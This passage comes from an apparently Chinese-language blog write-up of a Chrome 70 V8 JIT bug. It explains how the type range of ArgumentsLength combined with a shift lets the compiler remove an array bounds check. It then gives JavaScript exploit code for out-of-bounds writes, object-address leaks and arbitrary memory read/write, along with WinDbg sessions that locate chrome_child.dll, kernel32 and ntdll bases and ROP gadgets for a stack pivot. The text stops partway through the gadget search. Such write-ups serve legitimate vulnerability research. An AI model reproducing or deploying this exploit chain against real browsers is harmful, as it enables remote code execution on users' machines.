class="keyword">if</span> (shared.has_duplicate_parameters()) <span class="keyword">return</span> NoChange();</span><br><span class="line">        Node* <span class="keyword">const</span> callee = NodeProperties::GetValueInput(node, <span class="number">0</span>);</span><br><span class="line">        Node* <span class="keyword">const</span> context = NodeProperties::GetContextInput(node);</span><br><span class="line">        Node* effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">        Node* <span class="keyword">const</span> arguments_frame =</span><br><span class="line">            graph()-&gt;NewNode(simplified()-&gt;ArgumentsFrame());</span><br><span class="line">        Node* <span class="keyword">const</span> arguments_length = graph()-&gt;NewNode(</span><br><span class="line">            simplified()-&gt;ArgumentsLength(</span><br><span class="line">                shared.internal_formal_parameter_count(), <span class="literal">false</span>),</span><br><span class="line">            arguments_frame);</span><br><span class="line">        <span class="comment">// Allocate the elements backing store.</span></span><br><span class="line">        <span class="keyword">bool</span> has_aliased_arguments = <span class="literal">false</span>;</span><br><span class="line">        Node* <span class="keyword">const</span> elements = effect = AllocateAliasedArguments(</span><br><span class="line">            effect, control, context, arguments_frame, arguments_length, shared,</span><br><span class="line">            &amp;has_aliased_arguments);</span><br><span class="line">        <span class="comment">// Load the arguments object map.</span></span><br><span class="line">        Node* <span class="keyword">const</span> arguments_map = jsgraph()-&gt;Constant(</span><br><span class="line">            has_aliased_arguments</span><br><span class="line">                ? native_context().fast_aliased_arguments_map()</span><br><span class="line">                : native_context().sloppy_arguments_map());</span><br><span class="line">        <span class="comment">// Actually allocate and initialize the arguments object.</span></span><br><span class="line">        <span class="function">AllocationBuilder <span class="title">a</span><span class="params">(jsgraph(), effect, control)</span></span>;</span><br><span class="line">        Node* properties = jsgraph()-&gt;EmptyFixedArrayConstant();</span><br><span class="line">        STATIC_ASSERT(JSSloppyArgumentsObject::kSize == <span class="number">5</span> * kPointerSize);</span><br><span class="line">        a.Allocate(JSSloppyArgumentsObject::kSize);</span><br><span class="line">        a.Store(AccessBuilder::ForMap(), arguments_map);</span><br><span class="line">        a.Store(AccessBuilder::ForJSObjectPropertiesOrHash(), properties);</span><br><span class="line">        a.Store(AccessBuilder::ForJSObjectElements(), elements);</span><br><span class="line">        a.Store(AccessBuilder::ForArgumentsLength(), arguments_length);</span><br><span class="line">        a.Store(AccessBuilder::ForArgumentsCallee(), callee);</span><br><span class="line">        RelaxControls(node);</span><br><span class="line">        a.FinishAndChange(node);</span><br><span class="line">        <span class="keyword">return</span> Changed(node);</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br><span class="line">      ...</span><br><span class="line"><span class="keyword">void</span> Typer::Decorator::Decorate(Node* node) &#123;</span><br><span class="line">  <span class="keyword">if</span> (node-&gt;op()-&gt;ValueOutputCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// Only eagerly type-decorate nodes with known input types.</span></span><br><span class="line">    <span class="comment">// Other cases will generally require a proper fixpoint iteration with Run.</span></span><br><span class="line">    <span class="keyword">bool</span> is_typed = NodeProperties::IsTyped(node);</span><br><span class="line">    <span class="keyword">if</span> (is_typed || NodeProperties::AllValueInputsAreTyped(node)) &#123;</span><br><span class="line">      <span class="function">Visitor <span class="title">typing</span><span class="params">(typer_, <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line">      Type type = typing.TypeNode(node);</span><br><span class="line">      <span class="keyword">if</span> (is_typed) &#123;</span><br><span class="line">        type = Type::Intersect(type, NodeProperties::GetType(node),</span><br><span class="line">                               typer_-&gt;zone());</span><br><span class="line">      &#125;</span><br><span class="line">      NodeProperties::SetType(node, type);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Type Typer::Visitor::TypeArgumentsLength(Node* node) &#123;</span><br><span class="line">  <span class="keyword">return</span> TypeCache::Get().kArgumentsLengthType;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Type <span class="keyword">const</span> kArgumentsLengthType =</span><br><span class="line">    Type::Range(<span class="number">0.0</span>, Code::kMaxArguments, zone());</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kArgumentsBits = <span class="number">16</span>;</span><br><span class="line"><span class="comment">// Reserve one argument count value as the "don't adapt arguments" sentinel.</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kMaxArguments = (<span class="number">1</span> &lt;&lt; kArgumentsBits) - <span class="number">2</span>;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">#<span class="number">171</span>:ArgumentsLength[<span class="number">1</span>, <span class="keyword">not</span> rest length](#<span class="number">170</span>:ArgumentsFrame)  [Type: Range(<span class="number">0</span>, <span class="number">65534</span>)]</span><br></pre></td></tr></table></figure><p>然后在load elimination phase里将多余的LoadField remove，直接替换成真正的值，ArgumentsLength</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#72:SpeculativeNumberShiftRight[SignedSmall](#102:LoadField, #27:NumberConstant, #70:Checkpoint, #18:JSStackCheck)  [Type: Range(-32768, 32767)]</span><br><span class="line">-&gt;</span><br><span class="line">#72:SpeculativeNumberShiftRight[SignedSmall](#171:ArgumentsLength, #27:NumberConstant, #70:Checkpoint, #18:JSStackCheck)  [Type: Range(-32768, 32767)]</span><br></pre></td></tr></table></figure><p>于是在simplified lowering phase里，为了修正这个SpeculativeNumberShiftRight的范围，于是再次对其进行typer计算。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Forward propagation of types from type feedback.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RunTypePropagationPhase</span><span class="params">()</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">bool</span> updated = UpdateFeedbackType(node);    </span><br><span class="line">-&gt;</span><br><span class="line"><span class="function">Type <span class="title">OperationTyper::NumberShiftRight</span><span class="params">(Type lhs, Type rhs)</span> </span>&#123;</span><br><span class="line">  DCHECK(lhs.Is(Type::Number()));</span><br><span class="line">  DCHECK(rhs.Is(Type::Number()));</span><br><span class="line">  lhs = NumberToInt32(lhs);</span><br><span class="line">  rhs = NumberToUint32(rhs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lhs.IsNone() || rhs.IsNone()) <span class="keyword">return</span> Type::None();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int32_t</span> min_lhs = lhs.Min();</span><br><span class="line">  <span class="keyword">int32_t</span> max_lhs = lhs.Max();</span><br><span class="line">  <span class="keyword">uint32_t</span> min_rhs = rhs.Min();</span><br><span class="line">  <span class="keyword">uint32_t</span> max_rhs = rhs.Max();</span><br><span class="line">  <span class="keyword">if</span> (max_rhs &gt; <span class="number">31</span>) &#123;</span><br><span class="line">    <span class="comment">// rhs can be larger than the bitmask</span></span><br><span class="line">    max_rhs = <span class="number">31</span>;</span><br><span class="line">    min_rhs = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">double</span> <span class="built_in">min</span> = <span class="built_in">std</span>::<span class="built_in">min</span>(min_lhs &gt;&gt; min_rhs, min_lhs &gt;&gt; max_rhs);</span><br><span class="line">  <span class="keyword">double</span> <span class="built_in">max</span> = <span class="built_in">std</span>::<span class="built_in">max</span>(max_lhs &gt;&gt; min_rhs, max_lhs &gt;&gt; max_rhs);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">max</span> == kMaxInt &amp;&amp; <span class="built_in">min</span> == kMinInt) <span class="keyword">return</span> Type::Signed32();</span><br><span class="line">  <span class="keyword">return</span> Type::Range(<span class="built_in">min</span>, <span class="built_in">max</span>, zone());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Range(<span class="number">0</span>, <span class="number">65534</span>)</span><br><span class="line">Range(<span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">min</span> lhs is <span class="number">0</span></span><br><span class="line"><span class="built_in">min</span> rhs is <span class="number">16</span></span><br><span class="line"><span class="built_in">max</span> lhs is <span class="number">65534</span></span><br><span class="line"><span class="built_in">max</span> rhs is <span class="number">16</span></span><br><span class="line">-&gt;</span><br><span class="line"><span class="function">NumberShiftRight <span class="title">Range</span><span class="params">(<span class="number">0</span>,<span class="number">0</span>)</span></span></span><br></pre></td></tr></table></figure><p>由于这个结果被作为数组的index，所以最终在VisitCheckBounds里，会比较这个范围和数组最大的长度，如果始终index小于数组的length，那么就会将其remove掉。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VisitCheckBounds</span><span class="params">(Node* node, SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">    CheckParameters <span class="keyword">const</span>&amp; p = CheckParametersOf(node-&gt;op());</span><br><span class="line">    Type <span class="keyword">const</span> index_type = TypeOf(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type <span class="keyword">const</span> length_type = TypeOf(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (length_type.Is(Type::Unsigned31())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (index_type.Is(Type::Integral32OrMinusZero())) &#123;</span><br><span class="line">        <span class="comment">// Map -0 to 0, and the values in the [-2^31,-1] range to the</span></span><br><span class="line">        <span class="comment">// [2^31,2^32-1] range, which will be considered out-of-bounds</span></span><br><span class="line">        <span class="comment">// as well, because the &#123;length_type&#125; is limited to Unsigned31.</span></span><br><span class="line">        VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                   MachineRepresentation::kWord32);</span><br><span class="line">        <span class="keyword">if</span> (lower()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (lowering-&gt;poisoning_level_ ==</span><br><span class="line">                  PoisoningMitigationLevel::kDontPoison &amp;&amp;</span><br><span class="line">              (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">               (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                index_type.Max() &lt; length_type.Min()))) &#123;</span><br><span class="line">            <span class="comment">// The bounds check is redundant if we already know that</span></span><br><span class="line">            <span class="comment">// the index is within the bounds of [0.0, length[.</span></span><br><span class="line">            DeferReplacement(node, node-&gt;InputAt(<span class="number">0</span>));</span><br></pre></td></tr></table></figure><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="得到任意地址读写和用户态对象leak的原语"><a href="#得到任意地址读写和用户态对象leak的原语" class="headerlink" title="得到任意地址读写和用户态对象leak的原语"></a>得到任意地址读写和用户态对象leak的原语</h3><p>通过a1的单次越界写改掉oob_double_Array的长度，将其改的很大，然后在后面放一个object Array。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">a1[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">oob_double_Array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">oob_double_Array[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">object_Array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">object_Array[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">object_Array[<span class="number">1</span>] = leak;</span><br><span class="line">x = x &gt;&gt; <span class="number">16</span></span><br><span class="line">a1[x * <span class="number">19</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0x0000300000000000</span></span><br><span class="line">a1[x * <span class="number">21</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0x0000300000000000</span></span><br><span class="line">a1[x * <span class="number">41</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0x0000300000000000</span></span><br></pre></td></tr></table></figure><p>通过将要leak的对象放入object Array，然后通过oob_double_Array将该对象越界读出，得到的就是该对象的指针的double表示。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user_space_read</span>(<span class="params">leak</span>)</span>&#123;</span><br><span class="line">  object_Array[<span class="number">1</span>] = leak;</span><br><span class="line">  <span class="keyword">return</span> oob_double_Array[<span class="number">23</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们再new一个ArrayBuffer，通过oob_double_Array的越界写，可以改它的backing_store，于是就可以任意地址读写。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">oob_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writePtr</span>(<span class="params">offset, address, value</span>)</span>&#123;</span><br><span class="line">  oob_double_Array[offset] = address;</span><br><span class="line">  fake_dv = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(oob_buffer);</span><br><span class="line">  fake_dv[<span class="number">0</span>] = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readPtr</span>(<span class="params">offset, address</span>)</span>&#123;</span><br><span class="line">  oob_double_Array[offset] = address;</span><br><span class="line">  fake_dv = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(oob_buffer);</span><br><span class="line">  <span class="keyword">return</span> fake_dv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个小trick就是，我们的oob_double_Array和ArrayBuffer的偏移是不固定的。<br>但是通过user_space_read，我们可以先leak出oob_double_Array和oob_buffer的地址，由于oob_double_Array的fixedArray与其偏移是固定的，而oob_buffer的backing_store和oob_buffer的偏移是固定的.<br>所以我们可以计算出这个偏移是多少。</p><h3 id="得到chrome-child-dll的基地址"><a href="#得到chrome-child-dll的基地址" class="headerlink" title="得到chrome_child.dll的基地址"></a>得到chrome_child.dll的基地址</h3><p>leak出一个blink对象div的地址，它偏移0x20的位置是HTMLDivElement对象，读出后，再读出它首部的虚表地址，然后减去和chrome_child.dll的偏移就是chrome_child.dll的基地址了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line"><span class="keyword">let</span> div_addr = user_space_read(div);</span><br><span class="line">alert(<span class="string">"[+] the div_addr is at "</span> + Int64.fromDouble(div_addr).toString());</span><br><span class="line"></span><br><span class="line">el_addr = readPtr(offset, div_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble());</span><br><span class="line">alert(<span class="string">"[+] the el_addr is at "</span> + Int64.fromDouble(el_addr).toString());</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">0:017&gt; dq 0x00004c0eb3ea31f8</span><br><span class="line">00004c0e&#96;b3ea31f8  00007ffb&#96;49c9e910 000001e7&#96;ec4da5c0</span><br><span class="line">00004c0e&#96;b3ea3208  00000000&#96;000e101c 00000000&#96;00000000</span><br><span class="line">00004c0e&#96;b3ea3218  00004c0e&#96;b3ea2538 00000000&#96;00000000</span><br><span class="line">00004c0e&#96;b3ea3228  00000000&#96;00000000 00007ffb&#96;4a46d1f0</span><br><span class="line">00004c0e&#96;b3ea3238  00000000&#96;00000000 00000000&#96;00000000</span><br><span class="line">00004c0e&#96;b3ea3248  00005a68&#96;da2417e8 00000000&#96;00000000</span><br><span class="line">00004c0e&#96;b3ea3258  00000000&#96;00000000 00000000&#96;00000000</span><br><span class="line">00004c0e&#96;b3ea3268  00000000&#96;00000000 00000000&#96;00000000</span><br><span class="line">0:017&gt; g</span><br><span class="line">(3d7c.3af4): Break instruction exception - code 80000003 (first chance)</span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">00007ffb&#96;9da98cc0 cc              int     3</span><br><span class="line">0:017&gt; uf 00007ffb&#96;49c9e910</span><br><span class="line">chrome_child!blink::HTMLDivElement::&#96;vftable&#39;:</span><br><span class="line">00007ffb&#96;49c9e910 dcb14b47fb7f    fdiv    qword ptr [rcx+7FFB474Bh]</span><br><span class="line">00007ffb&#96;49c9e916 0000            add     byte ptr [rax],al</span><br><span class="line">00007ffb&#96;49c9e918 3030            xor     byte ptr [rax],dh</span><br><span class="line">00007ffb&#96;49c9e91a c247fb          ret     0FB47h</span><br><span class="line">0:017&gt; !address chrome_child</span><br><span class="line"></span><br><span class="line">                                     </span><br><span class="line">Mapping file section regions...</span><br><span class="line">Mapping module regions...</span><br><span class="line">Mapping PEB regions...</span><br><span class="line">Mapping TEB and stack regions...</span><br><span class="line">Mapping heap regions...</span><br><span class="line">Mapping page heap regions...</span><br><span class="line">Mapping other regions...</span><br><span class="line">Mapping stack trace database regions...</span><br><span class="line">Mapping activation context regions...</span><br><span class="line"></span><br><span class="line">Usage:                  Image</span><br><span class="line">Base Address:           00007ffb&#96;45960000</span><br><span class="line">End Address:            00007ffb&#96;45961000</span><br><span class="line">Region Size:            00000000&#96;00001000 (   4.000 kB)</span><br><span class="line">State:                  00001000          MEM_COMMIT</span><br><span class="line">Protect:                00000002          PAGE_READONLY</span><br><span class="line">Type:                   01000000          MEM_IMAGE</span><br><span class="line">Allocation Base:        00007ffb&#96;45960000</span><br><span class="line">Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY</span><br><span class="line">Image Path:             C:\Program Files (x86)\Google\Chrome\Application\70.0.3538.110\chrome_child.dll</span><br><span class="line">Module Name:            chrome_child</span><br><span class="line">Loaded Image Name:      C:\Program Files (x86)\Google\Chrome\Application\70.0.3538.110\chrome_child.dll</span><br><span class="line">Mapped Image Name:      </span><br><span class="line">More info:              lmv m chrome_child</span><br><span class="line">More info:              !lmi chrome_child</span><br><span class="line">More info:              ln 0x7ffb45960000</span><br><span class="line">More info:              !dh 0x7ffb45960000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Content source: 1 (target), length: 1000</span><br><span class="line">0:017&gt; ? 00007ffb&#96;49c9e910-00007ffb&#96;45960000</span><br><span class="line">Evaluate expression: 70510864 &#x3D; 00000000&#96;0433e910</span><br></pre></td></tr></table></figure><h3 id="计算kernel32的基地址"><a href="#计算kernel32的基地址" class="headerlink" title="计算kernel32的基地址"></a>计算kernel32的基地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; x chrome_child!*CreateEventW*</span><br><span class="line">00007ffb&#96;465faea2 chrome_child!media::MediaLog::CreateEventW (media::MediaLogEvent::Type)</span><br><span class="line">00007ffb&#96;4a33b4f8 chrome_child!_imp_CreateEventW &#x3D; &lt;no type information&gt;</span><br><span class="line"></span><br><span class="line">0:016&gt; dq 00007ffb&#96;4a33b4f8</span><br><span class="line">00007ffb&#96;4a33b4f8  00007ffb&#96;9c001f20</span><br><span class="line">0:016&gt; u 00007ffb&#96;9c001f20</span><br><span class="line">KERNEL32!CreateEventW:</span><br><span class="line">00007ffb&#96;9c001f20 ff2522480500    jmp     qword ptr [KERNEL32!_imp_CreateEventW (00007ffb&#96;9c056748)]</span><br><span class="line">00007ffb&#96;9c001f26 cc              int     3</span><br><span class="line">00007ffb&#96;9c001f27 cc              int     3</span><br><span class="line">00007ffb&#96;9c001f28 cc              int     3</span><br><span class="line">00007ffb&#96;9c001f29 cc              int     3</span><br><span class="line">00007ffb&#96;9c001f2a cc              int     3</span><br><span class="line">00007ffb&#96;9c001f2b cc              int     3</span><br><span class="line">00007ffb&#96;9c001f2c cc              int     3</span><br></pre></td></tr></table></figure><h3 id="计算ntdll的基地址"><a href="#计算ntdll的基地址" class="headerlink" title="计算ntdll的基地址"></a>计算ntdll的基地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; x KERNEL32!*NtQueryEvent*</span><br><span class="line">00007ffb&#96;9c056dd8 KERNEL32!_imp_NtQueryEvent &#x3D; &lt;no type information&gt;</span><br><span class="line">0:016&gt; dq 00007ffb&#96;9c056dd8</span><br><span class="line">00007ffb&#96;9c056dd8  00007ffb&#96;9da95db0</span><br><span class="line"></span><br><span class="line">0:016&gt; u 00007ffb&#96;9da95db0</span><br><span class="line">ntdll!NtQueryEvent:</span><br><span class="line">00007ffb&#96;9da95db0 4c8bd1          mov     r10,rcx</span><br><span class="line">00007ffb&#96;9da95db3 b856000000      mov     eax,56h</span><br><span class="line">00007ffb&#96;9da95db8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000&#96;7ffe0308)],1</span><br><span class="line">00007ffb&#96;9da95dc0 7503            jne     ntdll!NtQueryEvent+0x15 (00007ffb&#96;9da95dc5)</span><br><span class="line">00007ffb&#96;9da95dc2 0f05            syscall</span><br><span class="line">00007ffb&#96;9da95dc4 c3              ret</span><br><span class="line">00007ffb&#96;9da95dc5 cd2e            int     2Eh</span><br></pre></td></tr></table></figure><h3 id="寻找gadaget"><a href="#寻找gadaget" class="headerlink" title="寻找gadaget"></a>寻找gadaget</h3><h4 id="栈劫持"><a href="#栈劫持" class="headerlink" title="栈劫持"></a>栈劫持</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00007ff9&#96;296f0705 488b5150        mov     rdx,qword ptr [rcx+50h]</span><br><span class="line">00007ff9&#96;296f0709 488b6918        mov     rbp,qword ptr [rcx+18h]</span><br><span class="line">00007ff9&#96;296f070d 488b6110        mov     rsp,qword ptr [rcx+10h]</span><br><span class="line">00007ff9&#96;296f0711 ffe2            jmp     rdx</span><br></pre></td></tr></table></figure><p>search-&gt;sequence of bytes<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-12-03-084700.png" alt=""></p><h4 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; pop rcx ; ret     59 c3</span><br><span class="line">&#x2F;&#x2F; pop rdx ; ret       5a c3</span><br><span class="line">&#x2F;&#x2F; pop r8 ; ret      41 58 c3</span><br><span class="line">&#x2F;&#x2F; pop r9 ; ret      41 59 c3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; u 00007ffb&#96;45d6982c</span><br><span class="line">chrome_child!blink::AutoscrollController::HandleMouseMoveForMiddleClickAutoscroll+0x16c [C:\b\c\b\win64_clang\src\third_party\blink\renderer\core\page\autoscroll_controller.cc @ 237]:</span><br><span class="line">00007ffb&#96;45d6982c 59              pop     rcx</span><br><span class="line">00007ffb&#96;45d6982d c3              ret</span><br><span class="line"></span><br><span class="line">0:016&gt; s -w 00007ffb&#96;45960000 L1000000 C359</span><br><span class="line">00007ffb&#96;45d6982c  c359 0ff3 4411 2024 0ff3 7c11 2424 2e0f  Y....D$ ...|$$..</span><br><span class="line"></span><br><span class="line">0:016&gt; u 00007ffb&#96;45a8d91a</span><br><span class="line">chrome_child!cc::SingleKeyframeEffectAnimation::SingleKeyframeEffectAnimation+0x3a [C:\b\c\b\win64_clang\src\cc\animation\single_keyframe_effect_animation.cc @ 44]:</span><br><span class="line">00007ffb&#96;45a8d91a 5a              pop     rdx</span><br><span class="line">00007ffb&#96;45a8d91b c3              ret</span><br><span class="line"></span><br><span class="line">0:016&gt; s -w 00007ffb&#96;45960000 L1000000 C35a</span><br><span class="line">00007ffb&#96;45a8d91a  c35a 4803 c389 8b48 7856 2b48 7056 c148  Z..H..H.VxH+VpH.</span><br><span class="line"></span><br><span class="line">0:016&gt; u 00007ffb&#96;46b16012</span><br><span class="line">chrome_child!v8::internal::compiler::RawMachineAssembler::TargetParameter+0x2 [C:\b\c\b\win64_clang\src\v8\src\compiler\raw-machine-assembler.cc @ 82]:</span><br><span class="line">00007ffb&#96;46b16012 4158            pop     r8</span><br><span class="line">00007ffb&#96;46b16014 c3              ret</span><br><span class="line"></span><br><span class="line">0:016&gt; s -w 00007ffb&#96;45960000 L1000000 5841</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">00007ffb&#96;46b16012  5841 ccc3 cccc cccc cccc cccc cccc 4856  AX............VH</span><br><span class="line"></span><br><span class="line">0:016&gt; u 00007ffb&#96;472db44c</span><br><span class="line">chrome_child!DeblockLumaTransposeH2V_sse2+0x1ec:</span><br><span class="line">00007ffb&#96;472db44c 4159            pop     r9</span><br><span class="line">00007ffb&#96;472db44e c3              ret</span><br><span class="line">00007ffb&#96;472db44f 90              nop</span><br><span class="line"></span><br><span class="line">0:016&gt; s -w 00007ffb&#96;45960000 L1000000 